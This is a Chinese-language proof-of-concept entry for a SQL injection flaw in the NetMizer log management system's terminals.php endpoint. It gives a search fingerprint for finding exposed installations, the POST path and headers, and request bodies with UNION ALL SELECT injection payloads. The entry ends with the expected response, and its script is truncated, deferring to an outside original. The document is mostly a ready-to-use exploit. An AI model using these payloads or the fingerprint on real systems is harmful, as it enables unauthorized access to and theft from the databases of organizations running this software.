# NetMizer日志管理系统terminals.php存在SQL注入漏洞

- **系统**：NetMizer　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="NetMizer 日志管理系统"`
- **请求**：`POST /data/echart/terminals.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`　`Priority: u=0`　`Content-Length: 40`

**请求体 / payload**
```
action=phonelist-pie&type=3&device=1 UNION ALL SELECT NULL,CONCAT(0x71716a7a71,0x4b486d79695241494a69717451667a6d67487761764e72775a7066514176484f5a47697455596141,0x71766a7171),NULL-- -
POST /data/echart/terminals.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Priority: u=0
Content-Length: 40
action=phonelist-grid&type=3&device=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x546d5a417a6972554767676547636c6f794e4e6d464c4e484e49626b6d4c6b4244615a4f67646758,0x717a7a7171),NULL,NULL-- -
POST /data/echart/terminals.php H…（脚本共 825 字，完整版见原文）
```
- **预期**：200　|　—